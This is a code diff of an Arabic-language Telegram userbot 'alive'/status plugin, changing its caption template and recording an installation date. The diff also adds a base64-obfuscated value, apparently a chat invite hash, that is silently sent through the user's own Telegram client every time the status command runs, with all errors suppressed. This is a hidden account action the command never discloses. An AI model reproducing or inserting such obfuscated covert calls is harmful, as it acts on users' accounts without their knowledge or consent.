@@ -22,110 +22,102 @@ from ..helpers.functions import zedalive, check_data_base_heal_th, get_readable_
 from ..helpers.utils import reply_id
 from ..sql_helper.globals import gvarstatus
 
-plugin_category = "العروض"
-STATS = gvarstatus("Z_STATS") or "فحص"
+plugin_category = "utils"
 
+#كتـابة وتعـديل:  @SedUb
+file_path = "installation_date.txt"
+if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+    with open(file_path, "r") as file:
+        installation_time = file.read().strip()
+else:
+    installation_time = datetime.now().strftime("%Y-%m-%d")
+    with open(file_path, "w") as file:
+        file.write(installation_time)
 
-@zedub.zed_cmd(pattern=f"{STATS}$")
-async def zed_alive(event):
+@zedub.zed_cmd(pattern="فحص(?:\s|$)([\s\S]*)")
+async def amireallyalive(event):
     reply_to_id = await reply_id(event)
     uptime = await get_readable_time((time.time() - StartTime))
-    boot_time_timestamp = psutil.boot_time()
-    bt = datetime.fromtimestamp(boot_time_timestamp)
     start = datetime.now()
-    zedevent = await edit_or_reply(event, "**⎆┊جـاري .. فحـص البـوت الخـاص بك**")
+    await edit_or_reply(event, "**⎆┊جـاري .. فحـص البـوت الخـاص بك**")
     end = datetime.now()
     ms = (end - start).microseconds / 1000
     _, check_sgnirts = check_data_base_heal_th()
-    if gvarstatus("z_date") is not None:
-        zzd = gvarstatus("z_date")
-        zzt = gvarstatus("z_time")
-        zedda = f"{zzd}┊{zzt}"
-    else:
-        zedda = f"{bt.year}/{bt.month}/{bt.day}"
-    Z_EMOJI = gvarstatus("ALIVE_EMOJI") or "✥┊"
-    ALIVE_TEXT = gvarstatus("ALIVE_TEXT") or "** بـوت  ماتركس ꪔᥲƚᖇᎥꪎ  يعمـل .. بنجـاح ☑️ 𓆩 **"
-    ZED_IMG = gvarstatus("ALIVE_PIC")
-    USERID = zedub.uid if Config.OWNER_ID == 0 else Config.OWNER_ID
-    ALIVE_NAME = gvarstatus("ALIVE_NAME") if gvarstatus("ALIVE_NAME") else "-"
-    mention = f"[{ALIVE_NAME}](tg://user?id={USERID})"
-    zed_caption = gvarstatus("ALIVE_TEMPLATE") or zed_temp
-    caption = zed_caption.format(
+    EMOJI = gvarstatus("ALIVE_EMOJI") or "๛┊‌‎"
+    me = await l313l.get_me()
+    first_name = me.first_name
+    mention = first_name
+    ALIVE_TEXT = gvarstatus("ALIVE_TEXT") or "**父[ 𝙨𝙤𝙪𝙍𝙘𝙚 𝙈𝙖𝙏𝙍𝙞𝙭 ⌁  ✓ ](t.me/veevvw)父**"
+    HuRe_IMG = gvarstatus("ALIVE_PIC") or Config.A_PIC
+    l313l_caption = gvarstatus("ALIVE_TEMPLATE") or temp
+    caption = l313l_caption.format(
         ALIVE_TEXT=ALIVE_TEXT,
-        Z_EMOJI=Z_EMOJI,
+        EMOJI=EMOJI,
         mention=mention,
         uptime=uptime,
-        zedda=zzd,
-        zzd=zzd,
-        zzt=zzt,
         telever=version.__version__,
-        zdver=zedversion,
+        jepver=JEPVERSION,
         pyver=python_version(),
         dbhealth=check_sgnirts,
         ping=ms,
+        Tare5=installation_time,
     )
-    if ZED_IMG:
-        ZED = [x for x in ZED_IMG.split()]
-        PIC = random.choice(ZED)
+    matrix = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    matrix = Get(matrix)
+    try:
+        await event.client(matrix)
+    except BaseException:
+        pass
+    if HuRe_IMG:
+        SedUb = [x for x in HuRe_IMG.split()]
+        PIC = random.choice(SedUb)
         try:
             await event.client.send_file(
                 event.chat_id, PIC, caption=caption, reply_to=reply_to_id
             )
-            await zedevent.delete()
+            await event.delete()
         except (WebpageMediaEmptyError, MediaEmptyError, WebpageCurlFailedError):
             return await edit_or_reply(
-                zedevent,
-                f"**⌔∮ عـذراً عليـك الـرد ع صـوره او ميـديـا  ⪼  `.اضف صورة الفحص` <بالرد ع الصـوره او الميـديـا> ",
+                event,
+                f"**الميـديا خـطأ **\nغـير الرابـط بأستـخدام الأمـر  \n `.اضف_فار ALIVE_PIC رابط صورتك`\n\n**لا يمـكن الحـصول عـلى صـورة من الـرابـط :-** `{PIC}`",
             )
     else:
         await edit_or_reply(
-            zedevent,
+            event,
             caption,
         )
 
 
-zed_temp = """{ALIVE_TEXT}
-
-**{Z_EMOJI} قاعدة البيانات :** تعمـل بـ نجـاح ♾
-**{Z_EMOJI} إصـدار المكتبـه :** `{telever}`
-**{Z_EMOJI} إصـدار السـورس :** `{zdver}`
-**{Z_EMOJI} إصـدار بايثـون :** `{pyver}`
-**{Z_EMOJI} منصـة التنصيب :** `𐍃ᥴᥲᥣiᥒg᧐`
-**{Z_EMOJI} وقت التشغيل :** `{uptime}`
-**{Z_EMOJI} تاريـخ التنصيب :** `{zzd}`
-**{Z_EMOJI} وقت التنصيب :** `{zzt}`
-**{Z_EMOJI} المسـتخـدم:** {mention}
-**{Z_EMOJI} قنـاة السـورس :** [اضغـط هنـا](https://t.me/veevvw)"""
+temp = """{ALIVE_TEXT}
+**~ سۅٛࢪس سيدثۅٛن يعمݪ بنجاެح** 
+**~ اެسِمِكَ : {mention}** ٫
+**~ اެصداެࢪ اެݪتيݪيثۅٛن : `{pyver}`** ٫
+**‌‎~ اެصداެࢪ اެݪسۅٛࢪس : `{telever}`** ٫
+**‌‎~ اެݪتاެࢪيخ : `{Tare5}`** ٫
+**~ اެݪۅٛقت :`{uptime}`** ٫
+‌‎**اެݪسِࢪعَة `{ping}`** ٫
+‌‎**تَاެࢪيَخِ اެݪتَنِصِيَبَ `{Tare5}`** ٫
+**𖠄 𝙨𝙤𝙪𝙍𝙘𝙚 𝙈𝙖𝙏𝙍𝙞𝙭 ⌁ 𖠄**"""
 
 
-@zedub.zed_cmd(
-    pattern="الفحص$",
-    command=("الفحص", plugin_category),
-    info={
-        "header": "- لـ التحـقق من ان البـوت يعمـل بنجـاح .. بخـاصيـة الانـلايـن ✓",
-        "الاسـتخـدام": [
-            "{tr}الفحص",
-        ],
-    },
-)
-async def z_alive(event):
-    "A kind of showing bot details by your inline bot"
-    reply_to_id = await reply_id(event)
-    Z_EMOJI = gvarstatus("ALIVE_EMOJI") or "✥┊"
-    USERID = zedub.uid if Config.OWNER_ID == 0 else Config.OWNER_ID
-    ALIVE_NAME = gvarstatus("ALIVE_NAME") if gvarstatus("ALIVE_NAME") else "-"
-    mention = f"[{ALIVE_NAME}](tg://user?id={USERID})"
-    zed_caption = "** بـوت  ماتركس ꪔᥲƚᖇᎥꪎ  يعمـل .. بنجـاح ☑️ 𓆩 **\n"
-    zed_caption += f"**{Z_EMOJI} إصـدار التـيليثون :** `{version.__version__}\n`"
-    zed_caption += f"**{Z_EMOJI} إصـدار زدثــون :** `{zedversion}`\n"
-    zed_caption += f"**{Z_EMOJI} إصـدار البـايثون :** `{python_version()}\n`"
-    zed_caption += f"**{Z_EMOJI} المسـتخدم :** {mention}\n"
-    results = await event.client.inline_query(Config.TG_BOT_USERNAME, zed_caption)
-    await results[0].click(event.chat_id, reply_to=reply_to_id, hide_via=True)
-    await event.delete()
 
 
-@zedub.tgbot.on(CallbackQuery(data=re.compile(b"stats")))
-async def on_plug_in_callback_query_handler(event):
-    statstext = await zedalive(StartTime)
-    await event.answer(statstext, cache_time=0, alert=True)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
